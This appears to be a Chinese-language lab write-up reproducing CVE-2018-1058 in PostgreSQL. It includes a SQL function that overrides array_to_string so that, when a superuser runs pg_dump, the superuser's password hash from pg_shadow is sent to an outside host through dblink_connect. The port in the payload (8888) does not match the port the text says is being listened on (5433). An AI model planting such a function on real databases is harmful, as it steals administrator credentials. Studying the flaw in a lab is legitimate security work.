# PostgreSQL 提权漏洞（CVE-2018-1058）

###### by ADummy

### 0x00利用路线

​			普通用户连接到数据库--->注入危险代码--->等待超级用户登录触发后门--->收到敏感信息

### 0x01漏洞介绍

​			PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。

影响版本

```
PostgreSQL < 10
```

### 0x02漏洞复现

我们先通过普通用户`vulhub:vulhub`的身份登录postgres: `psql --host your-ip --username vulhub`

执行如下语句后退出：

```
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$
    select dblink_connect((select 'hostaddr=192.168.0.141 port=8888 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); 
    SELECT pg_catalog.array_to_string($1,$2);
$$ LANGUAGE SQL VOLATILE;
```

![PostgreSQL_提权漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PostgreSQL_提权漏洞_1.jpg)

然后我在`192.168.0.141`上监听5433端口，等待超级用户触发我们留下的这个“后门”，用超级用户的身份执行`pg_dump`命令：`docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub`，导出vulhub这个数据库的内容。执行上述命令的同时，“后门”已被触发192.168.0.141机器上已收到敏感信息：

![PostgreSQL_提权漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/PostgreSQL_提权漏洞_2.jpg)













